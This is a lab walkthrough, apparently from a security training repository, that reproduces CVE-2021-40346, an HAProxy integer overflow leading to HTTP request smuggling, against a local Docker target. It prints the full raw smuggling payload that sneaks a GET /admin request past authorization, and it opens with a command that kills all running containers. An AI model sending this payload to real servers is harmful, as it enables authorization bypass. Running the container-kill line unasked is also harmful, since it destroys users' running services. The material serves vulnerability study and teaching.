# HaProxy Integer Overflow to HTTP Smuggling (CVE-2021-40346)

HaProxy is a popular load balancer software. CVE-2021-40346 is an integer overflow vulnerability, which leads to http smuggling. And, in turn, HTTP Smuggling leads to potential authorization bypasses or other consequences (see References for HTTP Smuggling). \
A malicious Content-Length header leads to integer overflow. Later, this enables another vulnerability - HTTP Request Smuggling. In turn, this might lead to an authorization bypass.

### Clear any existing containers
```
docker kill $(docker ps -q)
```

## Build ##
```sh
cd 6-haproxy-overflow-2-smuggling
docker-compose build 
docker-compose up -d
```

## Proxy
Catch the base request into Burp. Try to access either 'guest' and 'admin' endpoints separately.
```
curl --proxy http://127.0.0.1:8080 http://192.168.139.128:10001/guest
```

![image](https://user-images.githubusercontent.com/31791455/140397000-4a163839-973f-42df-ac35-63601567f46e.png)


## Exploitation with Burp Suite
Remember to uncheck "update content length" when dealing with Smuggling in Burp! 

![image](https://user-images.githubusercontent.com/31791455/140394586-6a44d0f5-363e-455c-b22b-f619868bcc87.png)


## Exploit ##
Be careful - note that an extra line might break the exploit. Turn on newline preview (the '\n' button) in Repeater for extra visiblity.
```
POST /guest HTTP/1.1
Host: localhost:10001
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 23

GET /admin HTTP/1.1
h:GET /guest HTTP/1.1
Host: localhost:10001


```

![image](https://user-images.githubusercontent.com/31791455/140395810-d1890aee-1285-451a-a663-bbf35746b5db.png)



## Recommended reading:
https://forum.butian.net/share/694 \
https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/ \
https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

## Credits:
https://github.com/donky16/CVE-2021-40346-POC


